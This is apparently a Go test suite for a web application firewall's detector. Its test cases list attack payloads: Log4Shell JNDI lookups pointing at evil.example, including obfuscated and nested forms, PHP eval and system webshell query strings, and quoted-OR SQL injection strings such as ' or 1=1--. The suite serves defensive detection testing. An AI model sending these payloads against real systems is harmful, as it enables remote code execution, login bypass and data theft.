package semantic

import (
	"context"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestRecallHardeningDetectsCompleteAttackShapes(t *testing.T) {
	cases := []struct {
		name, method, target, body, want string
	}{
		{"jndi-ldap", "GET", "/solr/admin/cores?action=${jndi:ldap://evil.example/a}", "", "log4shell"},
		{"jndi-nested-host", "GET", "/x?q=${jndi:ldap://${sys:java.version}.evil.example/a}", "", "log4shell"},
		{"jndi-obfuscated", "GET", "/x?q=${${::-j}ndi:ldap://evil.example/a}", "", "log4shell"},
		{"php-callback-query", "GET", "/index.php?a=system&b=ls&code=$_GET[a]($_GET[b])", "", "webshell"},
		{"php-eval-get-query", "GET", "/index.php?x=@eval($_GET[_]);", "", "webshell"},
		{"php-eval-post-query", "GET", "/?s=/{${eval($_POST[u])}}", "", "webshell"},
		{"php-header-eval-query", "GET", "/1.php?code=eval(end(getallheaders()))", "", "rce"},
	}
	a := NewAnalyzer("block", 2)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(tc.method, "http://x"+tc.target, strings.NewReader(tc.body))
			reqCtx := &engine.RequestContext{Request: req, DecodedBody: []byte(tc.body), Metadata: map[string]any{}}
			got, err := a.Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if got == nil || !got.Detected {
				t.Fatalf("missed %s", tc.want)
			}
			if got.Category != tc.want {
				t.Fatalf("want %s got %s msg=%s", tc.want, got.Category, got.Message)
			}
		})
	}
}

func TestRecallHardeningQuotedOrIgnoresEnglishAlternatives(t *testing.T) {
	prose := `Impersonating a target's acquaintances (e.g., "测试环境/test environments" or "后台地址/admin portals"), or recent events to appear authentic.`
	if sqlQuotedOrPredicate.MatchString(prose) {
		t.Fatal("english quoted alternatives must not look like quoted OR injection")
	}
	attacks := []string{
		"' or '1'='1",
		"' or 1=1--",
		"' or ''='",
		`" or "1"="1"`,
		"' or 1--",
		"' or sleep(5)",
		"' or (select 1)",
		"admin' or 1=1#",
	}
	for _, payload := range attacks {
		if !sqlQuotedOrPredicate.MatchString(payload) {
			t.Fatalf("missed quoted OR injection %q", payload)
		}
	}
}

func TestRecallHardeningDoesNotFireOnAdvisoryProse(t *testing.T) {
	body := "Researchers documented eval($_GET['cmd']) and a Log4j JNDI lookup in a writeup. " +
		"The article also quotes Runtime.getRuntime().exec(request.getParameter(\"c\"))."
	req := httptest.NewRequest("POST", "http://x/api/articles", strings.NewReader(body))
	req.Header.Set("Content-Type", "text/plain")
	reqCtx := &engine.RequestContext{Request: req, DecodedBody: []byte(body), Metadata: map[string]any{}}
	got, err := NewAnalyzer("block", 2).Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if got != nil && got.Detected {
		t.Fatalf("advisory prose must not block: cat=%s msg=%s payload=%s", got.Category, got.Message, got.Payload)
	}
}
